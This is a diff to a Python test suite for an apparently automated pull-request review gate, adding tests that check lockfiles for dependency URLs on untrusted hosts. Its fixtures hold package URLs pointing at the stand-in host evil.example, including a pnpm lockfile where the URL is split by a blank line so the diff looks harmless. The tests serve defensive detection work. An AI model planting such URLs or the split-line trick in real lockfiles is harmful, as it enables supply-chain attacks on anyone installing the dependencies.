@@ -54,13 +54,14 @@ def shifted(diff, delta=40):
 class FakeGitHub:
     def __init__(self, diff=DIFF, head=HEAD, enabled_by=OWNER, auto_merge=True,
                  reviews=(), files=None, dismissals=(), base_ref="main", base_oid=BASE_OID,
-                 timeline=None):
+                 timeline=None, base_files=None):
         self.state = PullState(head_sha=head, auto_merge=auto_merge, enabled_by=enabled_by,
                                base_ref=base_ref, base_oid=base_oid)
         self.compared: list[tuple[str, str]] = []
         self.diff_text = diff
         self._reviews = list(reviews)
         self.files = files or {}
+        self.base_files = base_files or {}   # contents at base_oid; absent = 404
         self.posted: list[tuple[str, str, str]] = []
         self.dismissed: list[int] = []
         self.refuse_request_changes = False
@@ -81,6 +82,15 @@ class FakeGitHub:
         return data
 
     def file_content(self, path, ref, limit):
+        if ref == self.state.base_oid:
+            if path not in self.base_files:
+                raise GitHubError("file-content", 404)
+            data = self.base_files[path]
+            if isinstance(data, Exception):
+                raise data
+            if len(data) > limit:
+                raise TooLarge("contents")
+            return data
         self.fetched.append(path)
         data = self.files.get(path, b"x = 1\n")
         if len(data) > limit:
@@ -781,11 +791,64 @@ def test_override_never_clears_hidden_unicode():
     assert gh.posted[0][0] == "REQUEST_CHANGES" and "hidden-unicode" in gh.posted[0][2]
 
 
+LOCK_DIFF = ("diff --git a/uv.lock b/uv.lock\n--- a/uv.lock\n+++ b/uv.lock\n@@ -1 +1 @@\n"
+             '-x\n+url = "https://evil.example/p.whl"\n')
+EVIL_LOCK = {"uv.lock": b'url = "https://evil.example/p.whl"\n'}
+
+
 def test_override_never_clears_lockfile_hosts():
-    diff = ("diff --git a/uv.lock b/uv.lock\n--- a/uv.lock\n+++ b/uv.lock\n@@ -1 +1 @@\n"
-            '-x\n+url = "https://evil.example/p.whl"\n')
-    gh = blocked(diff=diff, dismissals=[dismissal(1, OWNER)])
+    gh = blocked(diff=LOCK_DIFF, files=EVIL_LOCK, dismissals=[dismissal(1, OWNER)])
     out, _ = run(gh, attempt=2)
+    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]
+
+
+# A URL split by a blank line inside a YAML block scalar. The diff shows only
+# one innocuous-looking added line; the whole file is what pnpm reads.
+PNPM_DIFF = ("diff --git a/pnpm-lock.yaml b/pnpm-lock.yaml\n--- a/pnpm-lock.yaml\n"
+             "+++ b/pnpm-lock.yaml\n@@ -5,1 +5,1 @@\n-        x\n+        .evil.example/p.tgz\n")
+PNPM_SPLIT = {"pnpm-lock.yaml": (b"packages:\n  a@1.0.0:\n    resolution:\n      tarball: |-\n"
+                                 b"        https://registry.npmjs.org\n\n        .evil.example/p.tgz\n")}
+
+
+def test_a_full_review_parses_the_whole_lockfile_at_the_head():
+    gh = FakeGitHub(diff=PNPM_DIFF, files=PNPM_SPLIT)
+    out, _ = run(gh)
+    assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]
+
+
+def test_a_bad_lockfile_value_already_in_the_live_base_does_not_block():
+    gh = FakeGitHub(diff=LOCK_DIFF, files=EVIL_LOCK, base_files=EVIL_LOCK)
+    out, _ = run(gh)
+    assert out.exit_code == 0, out.message
+
+
+def test_a_renamed_lockfile_is_compared_with_its_old_path_in_the_base():
+    diff = LOCK_DIFF.replace("a/uv.lock b/uv.lock", "a/old/uv.lock b/uv.lock").replace(
+        "--- a/uv.lock", "--- a/old/uv.lock")
+    gh = FakeGitHub(diff=diff, files=EVIL_LOCK, base_files={"old/uv.lock": EVIL_LOCK["uv.lock"]})
+    out, _ = run(gh)
+    assert out.exit_code == 0, out.message
+
+
+def test_a_base_lockfile_fetch_error_other_than_404_is_infra():
+    gh = FakeGitHub(diff=LOCK_DIFF, files=EVIL_LOCK,
+                    base_files={"uv.lock": GitHubError("file-content", 502)})
+    out, model = run(gh)
+    assert out.exit_code == 1 and out.message.startswith("infra:")
+    assert gh.posted == [] and model.calls == []
+
+
+def test_a_lockfile_over_the_fetch_cap_is_a_non_overridable_hit(monkeypatch):
+    monkeypatch.setattr(core, "FILE_FETCH_CAP", 10)
+    gh = blocked(diff=LOCK_DIFF, files=EVIL_LOCK, dismissals=[dismissal(1, OWNER)])
+    out, _ = run(gh, attempt=2)
+    assert out.exit_code == 1 and "too large to check" in gh.posted[0][2]
+
+
+def test_carry_over_parses_the_lockfile_too():
+    passed = gate_review("pass", OLD, own_hash_of(PNPM_DIFF), rid=5)
+    gh = FakeGitHub(diff=PNPM_DIFF, files=PNPM_SPLIT, reviews=[passed])
+    out, _ = run(gh, action="synchronize")
     assert out.exit_code == 1 and "lockfile-host" in gh.posted[0][2]
 
 
